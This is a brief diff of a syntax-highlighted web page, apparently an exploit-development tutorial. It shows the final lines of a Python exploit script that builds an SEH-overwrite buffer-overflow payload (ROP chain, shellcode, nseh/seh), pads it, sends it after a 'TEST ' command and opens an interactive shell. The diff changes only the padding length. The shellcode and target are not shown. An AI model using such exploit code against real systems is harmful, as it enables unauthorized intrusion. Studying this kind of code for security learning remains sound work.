@@ -1062,7 +1062,7 @@ payload</span><span class="o"> +=</span><span class="p"> rop
 payload</span><span class="o"> +=</span><span class="p"> shellcode
 payload</span><span class="o"> +=</span><span class="p"> junk
 payload</span><span class="o"> +=</span><span class="p"> nseh</span><span class="o"> +</span><span class="p"> seh
-payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"D"</span><span class="o"> *</span><span class="p"> (</span><span class="mi">3200</span><span class="o"> -</span><span class="no"> len</span><span class="p">(payload))
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"D"</span><span class="o"> *</span><span class="p"> (</span><span class="mi">4000</span><span class="o"> -</span><span class="no"> len</span><span class="p">(payload))
 
 shell.sendline(</span><span class="no">b</span><span class="s">"TEST "</span><span class="o"> +</span><span class="p"> payload)
 shell.interactive()</span>
